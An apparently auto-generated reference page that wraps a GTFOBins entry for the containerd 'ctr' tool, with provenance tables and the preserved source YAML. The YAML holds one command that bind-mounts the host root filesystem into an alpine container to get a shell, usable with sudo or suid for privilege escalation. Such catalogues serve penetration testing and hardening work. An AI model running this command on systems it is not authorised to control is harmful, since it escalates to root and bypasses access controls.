---
parsed_by: focuslocust
source: gtfobins
type: generated
---
# ctr

[Home](../../../README.md)

## Provenance

| Field | Value |
| --- | --- |
| Source | `gtfobins` |
| Type | `tool` |
| Record ID | `ctr` |
| Source file | `/home/adams/scorchederf/focuslocust/.cache/gtfobins/_gtfobins/ctr` |
| Parsed by | `focuslocust` |
| Relationship mode | `explicit / conservative inferred / manual` |

## Generated Concept Page

- [ctr](../../tools/linux/ctr.md)

## Extracted Fields

| Field | Value |
| --- | --- |
| id | ctr |
| name | ctr |
| type | tool |
| source | gtfobins |
| url | https://gtfobins.github.io/gtfobins/ctr/ |

## Preserved Source Material

````yaml
_body: ''
_name: ctr
_source_path: /home/adams/scorchederf/focuslocust/.cache/gtfobins/_gtfobins/ctr
functions:
  shell:
  - code: ctr run --rm --mount type=bind,src=/,dst=/,options=rbind -t docker.io/library/alpine:latest x
    comment: 'An image must be already present, for example:


      ```

      ctr images pull docker.io/library/alpine:latest

      ```'
    contexts:
      sudo: null
      suid: null
````
